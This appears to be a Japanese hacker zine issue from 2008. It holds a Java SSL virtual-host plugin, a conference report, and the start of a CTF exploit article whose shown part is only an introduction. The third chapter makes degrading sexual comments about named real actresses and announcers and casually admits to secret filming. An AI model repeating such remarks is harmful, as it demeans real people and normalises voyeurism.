@@ -1,0 +1,2005 @@
+[-]=======================================================================[-]
+
+                      Wizard Bible vol.44 (2008,12,21)
+
+[-]=======================================================================[-]
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第0章：目次 ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○第1章: マニアックJavaプログラミング第9回: 
+			      ～ SSLでなんちゃってバーチャルホスト 金床 著
+
+○第2章: レッツ、韓国――アウトプットのひとつのかたち  はせがわようすけ 著
+
+○第3章: TV局狂想曲                                              理事長 著
+
+○第4章: メモリアドレス推測と小さい領域への攻略コードの注入  Kenji Aiko 著
+
+○第5章: 基礎暗号学講座・第19回 ～平方剰余の相互法則～         IPUSIRON 著
+
+○第6章: お知らせ
+
+○第7章: 著者プロフィール
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第1章: マニアックJavaプログラミング第9回: ～ SSLでなんちゃってバーチャルホスト ---
+
+著者：金床
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　ﾎﾟｳﾝﾆﾁﾜﾎﾟｳﾝﾆﾁﾜ。筆者がはまったﾌｧｲﾙﾃﾞｨｽｸﾘﾌﾟﾀがﾘｰｸするJavaのバグ（詳しく
+はWB42参照）についてopenjdkコミュニティに報告したところ、やっと対応しても
+らうことになった。2009年に出るであろうjdk1.6.0_12で修正されるらしい。つー
+か遅いよ。
+
+　で、このバグについてはsecurity-devというメーリングリストで話し合ってい
+たのだが、先日SunのBradという人がある回避策を教えてくれた。
+
+http://www.nabble.com/-security-dev-00402-:-Re:-NullPointerException-at%09sun.security.ssl.OutputRecord.writeBuffer-td20492154.html
+
+　JSSEでは普通のプレーンなSocket（既にTCPの接続が完了しているもの）にかぶ
+せるようにしてSSLSocketを作成することができるので、これを使えば今回問題に
+なっているSSLServerSocketクラスを使わずに済む、というのである。ソースコー
+ドは以下のようなものだ。
+
+-----
+ServerSocket ss = new ServerSocket(port);
+Socket s = ss.accept();
+sslssf.createSocket(s, s.getInetAddress().getHostName(),s.getPort(), false);
+-----
+
+　筆者はcreateSocketの存在は知っていたが、てっきりこれはクライアント側で
+使うものだと思っていた。実際に実験してみると失敗したので、「これはクライ
+アント側で使うもんだろ(`Д´)ノゴラァ」とDisってみると、なんとsetUseClie
+ntModeでfalseを設定すればサーバー側でも使えるとのことである。マジすか。
+
+　つまりこういうことである。
+
+　普通にJavaでTCPサーバーアプリを書く場合、ServerSocketを作ってacceptする。
+acceptするとSocketクラスのインスタンスが生成される。このインスタンスに対
+してSSLSocketFactoryのcreateSocketを適用し、その戻り値となるSSLSocketクラ
+スのインスタンスにsetUseClientMode( false )するのである。するとなんとビッ
+クリ、SSLサーバーアプリになってしまうのだ。
+
+　このテクを使えば筆者を死滅させたバグから解放されるのである。なんだこん
+な方法あるならもっと早く教えてよ。つーかおせーよ。FOX2！
+
+
+■0x02.) 別の対策
+
+　…実は筆者は別の対策を採っていた。javassistで動的にパッチを当ててしまう
+というものだ。以下にコードの一部を抜粋する。
+
+-----
+ClassPool pool = ClassPool.getDefault();
+CtClass cc = pool.get( "com.sun.net.ssl.internal.ssl.OutputRecord" );
+CtMethod[] methodArray = cc.getDeclaredMethods();
+
+for( int i = 0; i < methodArray.length; ++i )
+        {
+        String methodName = methodArray[ i ].getName();
+        if( methodName.equals( "writeBuffer" ) )
+                {
+                CtMethod m = cc.getDeclaredMethod( methodName );
+                int mod = m.getModifiers();
+                m.insertBefore( "if($1 == null) return;" );
+                }
+        }
+Class c = cc.toClass();
+-----
+
+　WB42で書いたとおりOutputRecordクラスにたった一行nullチェックを入れれば
+解決する問題なので、javassistであれば一撃で解決してくれるのである。また当
+然ながらopenjdkを使っている場合は自分自身でソースコードを修正することもで
+きる。
+
+
+■0x03.) 本題
+
+　さてここからが今回の本題である。
+
+　JavaでSSLサーバーアプリを書く場合、100人中100人がSSLServerSocketFactor
+yを利用するだろう。しかし今回Bradたんが教えてくれたように、普通のServerS
+ocketでacceptしてから、SSLSocketFactoryを利用するという方法があるのだ。実
+に普通じゃない方法でかなりキモいが、この方法でのみ可能となる手法が存在す
+る。それは、TCPの接続が完了した"後"に、どのようなSSL接続を行うのかをサー
+バー側で決定できるという点である。
+
+　TCPの接続が完了すると、サーバー側はクライアント側のIPアドレスとポートを
+知ることができる。これらの情報を元にサーバー側がどの証明書を使用するのか
+を選ぶことができるため、SSLでなんちゃってバーチャルホストが実現できるのだ。
+
+
+■0x04.) SSLでバーチャルホスト問題
+
+　この問題については「SSL バーチャルホスト」でググれカス。あいや失礼、グ
+グってください閣下。とにかくSSLでバーチャルホストできないことは長年新米ア
+ドミンにとって悩みの種であり、未だに根本的な対策が取られていない大問題で
+ある（筆者も2002年くらいに数日悩んだ）。SNIというかなり良い感じの仕組みが
+出来ているのだが、IEの対応が悪いので本格的な運用が可能となるまではまだか
+かりそうだ。結局SSLを必要とするウェブサイトの数だけIPアドレスが欲しいとい
+う状況になりがちであり、IPv4アドレスの枯渇にさらに追い打ちをかける事態と
+なっている。
+
+
+■0x05.) なんちゃってバーチャルホストの実現
+
+　今回実験するなんちゃってSSLバーチャルホストは、「多くのウェブサイトでは
+まず最初にHTTP（プレーンのほう）でアクセスを行い、決済などの段階でHTTPSに
+移行する」という点に注目したものだ。また、「クライアントのIPアドレス1つが
+特定の1人のユーザを示す」という現実には使い物にならない前提でのみ動作する。
+あるユーザのアクセスがリクエストごとに異なるIPアドレスになる場合や、同じ
+IPアドレスから同時期に複数のユーザがアクセスする場合など（俗にAOLプロキシ
+状態として知られるやつである）は動作しない。
+
+　実験で使うホストは218.45.25.5であり、筆者のウェブサイトであるJUMPERZ.N
+ETが置かれているサーバーである。このサーバー上では実験に使えるバーチャル
+ホストとして以下の3つが稼働中である。
+
+　http://www.jumperz.net/index.php
+　http://guardian.jumperz.net/index.html
+　http://www.httptunnel.org/
+
+　まずプレーンなHTTPでこれらのうちの1つのサイトにアクセスする。次にURL入
+力欄を手動で変更し、プロトコルをhttps://に変更してアクセスしてみる。する
+と、そのウェブサイトに適した証明書を使ってSSLの処理が行われるのである（証
+明書は3つすべてがインチキなのでアラートのダイアログは出るが、ここではCNが
+ホスト名と一致する点に注目していただきたい）。
+
+　このデモはいまいち安定稼働していない気がするので、もしかしたら読者がア
+クセスしたときは既に動作していないかもしれない。mixiみたいにベータ版とい
+うことにしておく。
+
+
+■0x06.) 仕組み解説
+
+　サーバー側は最初のプレーンな方のアクセスの際に、クライアント（ここでは
+特定のIPアドレス）がどのウェブサイトを見に来たのかを知ることができるので、
+この情報を保持しておく。しばらくしてクライアントがSSLポートへアクセスして
+きた時は、サーバー側はクライアントのIPアドレスから、このユーザがもっとも
+最近ではどのウェブサイトを見に来たかを調べ、それに合った証明書を選択する、
+というものだ。非常にシンプルな仕組みである。
+
+
+■0x07.) ソースコード
+
+　今回筆者は手早く動作させるためにGuardian@JUMPERZ.NETのプラグインとして
+作成してみた。ソースコードは以下のようなものだ。
+
+-----
+package net.jumperz.app.MGuardian.plugin.sslotf;
+
+import net.jumperz.io.*;
+import net.jumperz.net.*;
+import net.jumperz.security.*;
+import net.jumperz.util.*;
+import java.security.NoSuchAlgorithmException;
+import java.util.*;
+import java.io.*;
+import java.util.regex.*;
+import java.sql.*;
+import net.jumperz.sql.*;
+import net.jumperz.app.MGuardian.*;
+import net.jumperz.app.MGuardian.plugin.*;
+import java.net.*;
+import javax.net.ssl.*;
+
+public class MSslOtf
+extends MGuardianPlugin
+implements MObserver1
+{
+private MMultiAcceptor acceptor;
+private String baseDirName;
+private Map hostFactoryMap = Collections.synchronizedMap( new HashMap() );
+private Map ipHostMap      = Collections.synchronizedMap( new HashMap() );
+private String defaultHost;
+// ----------
+public void update()
+{
+int state = acceptor.getState();
+if( state == MMultiAcceptor.ACCEPTED )
+	{
+	Socket socket = acceptor.getSocket();
+	String ip = socket.getInetAddress().getHostAddress();
+	String host = defaultHost;
+	if( ipHostMap.containsKey( ip ) )
+		{
+		host = ( String )ipHostMap.get( ip );
+		}
+	SSLSocketFactory factory = ( SSLSocketFactory )hostFactoryMap.get( host );
+	try
+		{
+		SSLSocket ssls = ( SSLSocket )factory.createSocket( socket, socket.getInetAddress().getHostName(), socket.getPort(), false );
+		ssls.setUseClientMode( false );
+		MGuardianImpl.getInstance().startSession( ssls );		
+		}
+	catch( Exception e )
+		{
+		info( e );
+		}
+	}
+}
+// ----------
+public void startup()
+throws IOException
+{
+className = "SSLOTF";
+
+debug( "startup" );
+
+if( System.getProperty( "os.name" ).indexOf( "Windows" ) == -1 )
+	{
+	baseDirName = "/etc/guardian/sslotf/";
+	}
+else
+	{
+	baseDirName = "sslotf/";
+	}
+
+acceptor = new MMultiAcceptor( 443 );
+acceptor.register1( this );
+
+MGuardianImpl.getInstance().getThreadPool().addCommand( acceptor );
+
+File dir = new File( baseDirName );
+String[] files = dir.list();
+defaultHost = files[ 0 ];
+for( int i = 0; i < files.length; ++i )
+	{
+	String host = files[ i ];
+	try
+		{
+		initFactory( host );
+		}
+	catch( Exception e )
+		{
+		warn( e );
+		throw new IOException( e.getMessage() );
+		}
+	}
+}
+// ----------
+private void initFactory( String host )
+throws Exception
+{
+InputStream certIn = new FileInputStream( baseDirName + "/" + host + "/cert.pem" );
+InputStream keyIn  = new FileInputStream( baseDirName + "/" + host + "/priv_key_pkcs8_der" );
+java.security.KeyStore keystore = MSecurityUtil.generateKeyStore( certIn, keyIn, "RSA" );
+SSLContext ctx = MSecurityUtil.getSslContext();
+MSecurityUtil.initSslContextForServer( ctx, keystore );
+SSLSocketFactory sslsf = ( SSLSocketFactory )ctx.getSocketFactory();
+
+debug( host );
+hostFactoryMap.put( host, sslsf );
+}
+// ----------
+public synchronized Map execute( Map sessionInfo )
+{
+try
+	{
+	MHttpRequest request = ( MHttpRequest )sessionInfo.get( "request" );
+	String host = request.getHeaderValue( "Host" );
+	if( host == null || !hostFactoryMap.containsKey( host ) )
+		{
+		return null;
+		}
+	if( ipHostMap.size() > 50000 )
+		{
+		ipHostMap = new HashMap();
+		}
+	Socket socket = ( Socket )sessionInfo.get( "clientSideSocket" );
+	ipHostMap.put( socket.getInetAddress().getHostAddress(), host );
+	}
+catch( Exception e )
+	{
+	e.printStackTrace();
+	}
+return null;
+}
+-----
+
+　JavaでSSLサーバーを書いたことがある人ならば同じようなものが簡単に書ける
+だろう。
+
+
+■0x08.) まとめ
+
+　今回は普通にサーバー側でacceptしたSocketクラスのインスタンスを利用して
+SSLサーバーが実現できるというキモテクを元に、SSLで限定的なバーチャルホス
+トを実現した。現実には商業レベルのウェブサイトでは使い物にならないが、趣
+味レベルのウェブサイトならば使うことができるかもしれない。自宅の固定IPア
+ドレスがグローバル一個だけだが、何とかSSLでバーチャルホストしたい！という
+ような人には使える技術かもしれない。
+
+　Apacheでこれを実現するのは、どうしても設定ファイルベースとなってしまう
+ため（クライアントIPアドレスと証明書の関係が動的に変化するため）難しいだ
+ろう。一方OpenSSLのAPIを直で叩いてC言語でサーバーを書くぜ！というような人
+ならば（編集部注:そんなやついません）もちろん可能である。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第2章: レッツ、韓国――アウトプットのひとつのかたち ---
+
+著者：はせがわようすけ
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　みなさん、ﾎﾟｳﾝﾆﾁﾜ、はせがわです。2008年11月13日、14日に韓国で行われた
+「POC2008」で講演する機会がありました。海外のセキュリティカンファレンスで
+話すことができたことは大変光栄なことです。今回はスピーカーとして見たPOC2
+008をレポートしましょう。
+
+　なお、発表内容の技術的な話題についてはKenjiさんのブログが詳しいので、そ
+ちらを参照ください。
+
+http://d.hatena.ne.jp/kenjiaiko/20081114/1226614872
+http://d.hatena.ne.jp/kenjiaiko/20081114/1226667633
+
+
+■0x02). まさかのお誘い
+
+　10月に行われたBlack Hat Japan 2008にて、講演を終えた私に話しかけてきた
+方がPOCの主催者であるVangelis氏でした。「オマエの講演おもしろかったよ。ぜ
+ひ今度韓国のPOCで話してよ。今年は11月なのでもう間に合わないけど、来年ぜひ。
+日本語のわかる通訳も用意するので。」といった感じのことを言われていたので
+すが、私は英語がほとんどわからないので細かなニュアンスをつかみ切れず、(は
+いはい社交辞令、社交辞令)と軽く流し、「Thank you」程度の返事をしただけだ
+ったのでした。
+
+　そして、それから3週間ほど経ち、いつもどおり会社で仕事しているふりをして
+いると、そのVangelis氏からメールが来たのでした。「スピーカが一人来れなく
+なったので、ぜひ来てほしい。あと2週間もないので今日中に返事が欲しい」とい
+った内容です。
+
+　とにかく返事を急がなくてはいけないので、会社に相談しつつ、昨年度のPOCで
+スピーカを務めたfkmr氏にどうしたものかと相談を持ちかけたのでした。fkmr氏
+から3分もたたずに返ってきた返事は「ぜひ参加するべき」というものでしたし、
+会社からもすぐに「行ってらっしゃいー」と軽いノリの許可が出たので、Vangelis
+氏にはOKの旨を伝えたのでした。
+
+
+■0x03). 準備
+
+　発表そのものはBlack Hat Japanでの内容と同じものであるとはいえ、自分のな
+かではすでに燃焼しつくして過去のものになっているので自分の発表であるにも
+関わらず内容を全く覚えていないとか、せっかくならデモは韓国語Windows上でや
+りたいとか、"YellowHat"ネタは通じないだろうとか、いろいろ不安や変更すべき
+点がありました。
+
+　すでに発表当日まで2週間を切っていたのですが、そんなことで焦っていたらKe
+njiさんに「おれは2日でゼロから準備したよ」とか言われそうな気がしたので、
+表面的には余裕をかましつつも、けっこういっぱいいっぱいになりながら準備を進
+めていたのでした。
+
+　とはいえ、英語もさっぱりわからないのに一人で出かけていくのはかなり不安
+でもあったので、無理やりKenjiさんを連れて行くことにしたのでした。
+
+
+■0x04). 韓国へ到着
+
+　空港へは、POCのスタッフ2名(女子大生!!)が迎えに来てくれており、タクシー
+で会場のホテルへ向かいました。車中、Kenjiさんは彼女たちと「日本のアニメは
+そっちでも人気なんだー」とか英語で和やかに談笑しているのですが、私は英語
+がさっぱりわかんないので「韓国って車の運転荒くてこわいなー」と思いながら
+車窓からの風景を眺めていたのでした。
+
+　当日夜は韓国のメディアからインタビューを受けることになりました。ホテル
+の部屋で記者から「今からいい？」と電話を受けたものの、待ち合わせ場所など
+がさっぱり聞き取れず、ホテル内を探し回って30分遅れくらいでようやく記者と
+合流できたのでした。
+　相変わらず英語はさっぱりわからないので、通訳としてKenjiさんも無理やり同
+席させ、記者1(韓国語)→記者2が英語に翻訳→Kenjiさんが日本語に翻訳→私、と
+いう多段プロキシな状態でインタビューは進みました。質問の多くは専門的な内
+容ではなく、セキュリティに関する一般的な話題でしたので、通訳の煩わしさも
+あり、そのほとんどにKenjiさんが直接答えたりもしていましたし、最後にはKen
+jiさんも写真を撮影してもらったりしていましたので、記者の方には私よりもKe
+njiさんのほうが印象深かったのではないかと思います。
+
+　ちなみに、そのときのインタビューを元にした記事が以下にて見ることができます。
+
+http://translate.google.co.jp/translate?hl=ja&sl=ko&u=http://www.boannews.com/media/view.asp%3Fidx%3D12629%26kind%3D1&sa=X&oi=translate&resnum=1&ct=result&prev=/search%3Fq%3Dsite:boannews.com%2B%25ED%2595%259C%25EA%25B5%25AD,%2B%25EB%25B6%2588%25EB%25B2%2
+
+
+■0x05). 発表
+
+　Black Hat Japanでの発表に比べ、POCというイベントの聴講者は、見た感じで
+は学生っぽい若者が多く、服装もカジュアルな方がほとんどでした。若さゆえの
+過ちなのか、彼らは自分に興味のない発表だと、容赦なく机に突っ伏して寝てい
+ます。私の発表では、幸いにも寝ている人は見られなかったので、それなりにみ
+んなに興味を持ってもらえたようで、それだけで満足できました。
+
+　他のスピーカの発表や聴衆の反応を見ていると、文化の違いからなのか、韓国
+では理論や研究的な内容よりも、実戦的な実演結果のほうが好まれるように思い
+ました。その点では、私自身の発表では理屈の説明だけでなく所々に簡単なデモ
+を含めていたのが功を奏したのかも知れません。
+
+
+■0x06). 終りに
+
+　10月のBlack Hat Japan、11月のPOC2008と大きなイベントに立て続けに参加し
+て思ったのですが、やはり大切なのは英語だということを改めて痛感しました。
+　イベントを通じて多くの人と会い、たくさんのコミュニケーションができるせ
+っかくの機会なのに、英語がわからないと全く何もできません。2009年はもう少
+し英語を勉強しようと思います。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第3章: TV局狂想曲 ---
+
+著者：理事長
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+Guten Tag !
+Wie geht es Ihnen ?
+
+　寒さが身にしみて凍死しそうになる昨今、いかがお過ごしでしょうか？
+ワタクシはアパートの軒先に柿のタネを植えてみましたが、何の変化も起こりま
+せん。
+
+　やはりピーナッツがないとだめなのでしょうか？それとも根本的に、何かが間
+違っているのでしょうか？
+
+【編注】この文書は著者：宗凶法人愛連合准尉、編集：宗凶法人愛連合理事長と
+なっています。
+
+
+■0x02.) 数年前のTV局のアレゲな事情
+
+　さて、皆さんも１つや２つ、テレビ関係の噂を耳にしたことが有ると思います。
+　「モー娘。はつんく♂にやられた」とかそんな類の噂話。まぁ、芸能関係はあ
+まりお話しできませんが、?代わりにテレビ局内の裏事情でもお話ししようと思い
+ます。もちろん社員でもないので、噂は噂。だから、私が体験したことをそのまま
+皆様にお伝えしようと思います。?
+
+　さて、テレビ局の裏話を始める前に、?なぜワタシがそんな裏事情を知っている
+のかというと、簡単です。テレビ局で働いていました。?正確にはフジテレビ関連
+でお仕事をさせて頂きました。ご存知の方もいらっしゃると思いますが、数年前
+の夏、?フジテレビで「お台場冒険王」というイベントがありました。私、それに
+関わっていましたし、?自分ではかなり重要なスタッフであったと認識しておりま
+す。
+　さらにぶっちゃけてしまうと、?「お台場冒険王ウォーターボーイズ」の関連者
+でもあります。まぁ、?そんなこんなでフジテレビとの関わりを持つことができた
+わけであります。さて、「お台場冒険王」で一番の目玉商品、?それはやはり私も
+関わった「ウォーターボーイズ」でしょう。今回はその「ウォーターボーイズ」
+が講演できるまでを公開したいと思います。フジテレビの適当さが浮き彫りにな
+ること必死です。
+
+　「一緒に仕事しない？」??友達からこんな事を言われました。同じバイト仲間
+のＭさんです。?この方、中々変わった職歴の持ち主で、高校時代に音楽でメジャ
+ーデビューをし、?演劇の舞台監督もこなし、年末になると紅白歌合戦のバックで
+演奏?（実は演奏していない。紅白はカラオケが多いらしい）しながら、?水泳の
+インストラクターのアルバイトをしているという３０代後半の男性です。
+　話を聞くと、「フジテレビがイベント（冒険王）のために、ウン千万かけて屋
+外プールを作るから、そこで面白いことしてくれない？お金１５００万円あげる
+からさ」とのこと。
+
+　どうやらこの時点で男のシンクロ、「ウォーターボーイズ」をすることが決ま
+っていたらしいです。Ｍさんが「ギャラ奮発するからさ～」この瞬間に私は名目
+上「お台場冒険王ウォーターボーイズアシスタントマネージャー」という役職に
+就きました。シンクロは人間がやります。
+　しかし、シンクロをしてくれる人間がいません。そこでフジテレビにお願いし
+て、テレビで募集をかけてくれないかとお願いしてみたところ、「了解～めざま
+しテレビで募集かけるよ～」とのこと。…………ほんの２～３秒で、スーパー（
+字幕）が出ただけでした。確かに、めざましテレビで募集してくれましたよ！で
+もね、この募集の仕方は鬼だと思いましたよ。
+　だから、しょうがなく私がシンクロしてくれる人を探しました。ウォーターボ
+ーイズは全部で確か２０人。?その内の５人を私の身内からシンクロさせましたよ。
+４４日公演＋約２週間合宿（交通費自費）＋通い練習（交通費自費）＝約２ヶ月
+半で約２０万円という血反吐吐きそうなギャラで…。このギャラを提示させられ、
+普通の人ならやりません。?２ヶ月半普通にアルバイトすればそれ以上稼げるし、
+なにより大学生もいます。
+
+　冒険王終了後ですが、大学生は軒並み前期の単位を落としています。つまり、
+頭の悪い人がフジテレビと関わりをもったのです。さてさて、ウォーターボーイ
+ズの演技も完璧に近づき、本公演まで数日に迫った頃、大問題が発生。「プール
+完成してません」死にさらせフジテレビ！本公演まであと２～３日しかないのに
+舞台が無いってのはどういうこった？?確か１週間前には完成させますとか言って
+なかったか？嘘か？嘘つきか？?
+　そのせいで私がどれだけテンパったかご存知？??し・か・も　プール（観客席
+も含めその一帯）が、まったく予定完成図と異なるのはどういう事ですか？　水
+深は確か１．２ｍくらいでお願いしましたよね？　それくらいじゃないとジャン
+プとかの演技ができないんですよ。　何ですか１．４ｍって？このたかだか２０
+ｃｍのおかげで、?私が暇を見つけては水深を調整したりもしたんですよ。
+　あと、プールの命といえる塩素。これも微調整ができなく、ちょくちょく見な
+いと水が大変なことになりました。余計な仕事を増やさないでください。他にも、
+このまったく完成予定図と異なったプールは大問題の嵐。観客席からプールまで
+の距離も全然違うし、高さも違う。こっちは裸足で仕事するのに（水着になるか
+ら）、砂利道を歩けとおっしゃる（すのこが後日届きました）。備品は全く届か
+ず、申請したら全然違う部署に運ばれるし。フジテレビ、しっかりしてください！
+
+　問題だらけで抱えたＧＰ（ゲネプロ。簡単に言えば通し稽古）当日。フジのお
+偉い様方も来てました。……このときのフジのお偉い様方、?あんまり興味なさそ
+うに見えたのは私だけでしょうか？　当たり障り無い言葉を言って立ち去ってい
+きました。つまり、この時には我々「お台場冒険王ウォーターボーイズ」は、ま
+ったく期待されていなかったわけです。この内容は、世界中で私とＭさんしか知
+らない超極秘内容ですので、もしフジからクレーム来たら、私かなり困ります。
+[そのときは、宗教法人愛連合中央執行委員会が責任持ちますよ。理事長記す。]
+　とりあえず思い出を振り返ってみましょう?・イベントを行った４４日間で3,4
+88,434人の来場?・MEGUMIのTシャツはち切れそうだった。社員食堂で普通にご飯
+食べてた。
+
+・小池栄子のおっぱいキャノン砲。挨拶もしれくれないほど冷たい人。
+・石垣佑磨・石井智也・宮地真緒・香椎由宇（ドラマウォーターボーイズ出演）
+はスタッフに優しかった。
+・女子アナ高島彩（主にめざましテレビ）、可愛かったけどあんまり胸無いよう
+に思えた。
+・女子アナ千野志麻（主にF2-X）、可愛くもないし胸もないし無愛想だし挨拶も
+しない、ナイナイ尽くしの女子アナ。
+・女だらけの水泳大会を盗撮していたらばれて怒られた。
+・お笑いカンニングの芸の無さ。
+・フジテレビの金遣いの荒さ。
+
+　……ろくすっぽ素敵な思いでないですね。全ておっぱいに支配されています。
+MEGUMIはノーメイクで普通に飯食ってました。テレビより生で見る方が可愛いで
+す。やはりMEGUMI＝おっぱいです。顔より先に胸に視線がいきました。胸を見て
+「あ！MEGUMIだ！」と思ったぐらいですから。?会話こそしませんでしたが、テレ
+ビで見るより柔らかい印象を受けたので、?イメージは変わりました。?
+　小池栄子、こいつは本当にダメダメです。胸がなかったら価値無しです。イベ
+ントで一緒の仕事だったのですが、挨拶もろくにできない人です。しかし、おっ
+ぱいだけは超一流だと思いました。
+　ドラマウォーターボーイズ出演の上記４名は、本当に良い方たちでした。スタ
+ッフに優しく、ちゃんとスタッフを人間扱いしてくれました。スタッフみんなで
+集合写真までOKしてくれたこの優しさ！小池栄子！この人たちを見習え！！私、
+この４名と個別に写真を撮らせて頂きました。その時、宮地真緒のシャツの横か
+らおっぱい見ちゃいましたが、貧乳だったのでゲンナリです。
+
+　めざましテレビアナウンサー高島彩。とっても可愛く綺麗な女性でした。一度
+で良いからお相手してもらいたいと、本気で願ったくらいです。しかし、残念な
+がらあんまり頭の切れは良くなさそうな感じを受けました。天然ぽいから、その
+筋の方にはOKだと思います。
+　女子アナ千野！！こいつは小池栄子に続く態度悪い女です。小池栄子同様、一
+緒に仕事をするんですが、私、こいつと打ち合わせまでしました。打ち合わせ中
+なのにろくすっぽ話は聞かないし、化粧は濃い、胸もない！?こいつもナイナイ尽
+くしです。
+
+　女だらけの水泳大会、これが一番思い出深かったです。とりあえず体つきはエ
+ロいが、頭が悪すぎです。可愛ければOK！みたいな馬鹿娘しかいませんでした。
+でも、水着の上に「ミニ浴衣」というステッキーな衣装を身に纏っていたので、
+OKです。
+　あと、台本にはお約束の「ポロリ」もありました。皆さん、この「ポロリ」や
+らせだって知っていました？私は知りませんでした。だって台本に「ここでポロ
+リ」みたいなことが書いてあるし……。しかも、「ポロリする女性はAV女優」だ
+っていうから……・゜・(ノД`)・゜・?
+
+　お笑い芸人カンニング。?今でこそテレビでたま～に見ますが、こいつら本当に
+おもしろくないです。何より運動神経がゼロ！私、カンニングの細い方に演技指
+導したのですが、?全く覚えられないという要領の無さ！小池栄子とカンニングの
+二人がコメントのキャッチボールをしていたのですが?（同じ仕事でした）、キャ
+ッチボールになりません。あの時の小池栄子の汚物を見るような目は忘れません。
+
+　さて、今回の話の発端となったフジテレビ。フジテレビ（どこの局もそうかも
+しれませんが）は金遣いが半端じゃないと思いま?した。というより、企画を丸投
+げしすぎです。イベント会場に何か作るからそこで芸しろ！こんなところです。
+
+　まだまだ有ります。その「ウォーターボーイズ」が物凄く人気が出てしまい、
+フジテレビのこのイベントを支配し始めた頃、お偉い様方が来て、「（確か）５
+００万円あげるからもっと沢山やって」因みに４４日間の内、OFFはトータルで１
+週間もなく、一日中体を張っています。勿論ピークなんてとうの昔に超え、夏な
+のに熱が出るスタッフ、意識朦朧で「芸」をして骨を折るスタッフなど、過酷な
+中、金で何とかしようとしてきました。受け取ってスタッフには頑張ってもらい
+ましたけどね。因みにその「芸」をしているスタッフはこの（確か）５００万円
+の存在を知りません。我々重要なスタッフたちのギャラとして消えました。お金
+以外に、物でも人を操ります。
+　４４日間でフジ関係からもらった物・奢ってもらった物（覚えている範囲で）
+は、ビール（沢山）、栄養ドリンク（沢山）、服（高価な物）、?焼き肉（一人
+２万くらいでトータル５０万円ほど）、打ち上げのホテル貸し切り（一部）等々、
+盛りだくさんです。
+　一番吃驚したことは、イベント終了後の打ち上げです。フジテレビの隣にある
+パシフィックメリディアンの一部を貸し切って行われました。因みにフジの社員
+はこのホテル１泊１万円で泊まれるらしいです。あり得ないです。
+
+　さて、この打ち上げでフジのお偉い様方も来て、盛大に行われましたが、おか
+しな単語が飛び交います。
+
+「○○（偉い人の名前）さん、お金出して出して」
+「●●（もっと偉い人の名前）さん、あなたも出して」
+「□□（さらに偉い人の名前）さん、財布出して出して」
+「▲▲（ここまで来ると常務とか部長とかのレベルの人）さん、有り金全部出して」
+
+　集まった金額は約２０万円。「２０万円争奪じゃんけん大会！」
+　……世界が違いますね。
+
+　最後に経費使い込みの実態をここに明らかにします。イベントトータル４４日
+間で、フジテレビの経費」という言葉に甘えた結果、羅漢果に確か５回、すし京
+辰１回、権八１回、ZEST　CANTINA１０回以上、Cafe　La　Boheme１０回以上、
+パシフィックメリディアン２０泊以上。
+
+　あんまり良い思い出はありませんね。
+　フジテレビに良い印象を持てないのが現状です。?
+
+
+■0x03.) 最後に
+
+?　それでも、また同じような企画をするようです。金、有り余っていますねｗ?
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第4章: メモリアドレス推測と小さい領域への攻略コードの注入 ---
+
+著者：Kenji Aiko
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　世界規模で開催されるハッキングコンテスト「DEFCON Capture the Flag（以下
+CTF）」には、様々なセキュリティホールを利用してパスワードを取得するRemote
+ Exploiting系の問題があります。今回、その中からひとつ問題を選び、その回答
+方法を紹介します。
+
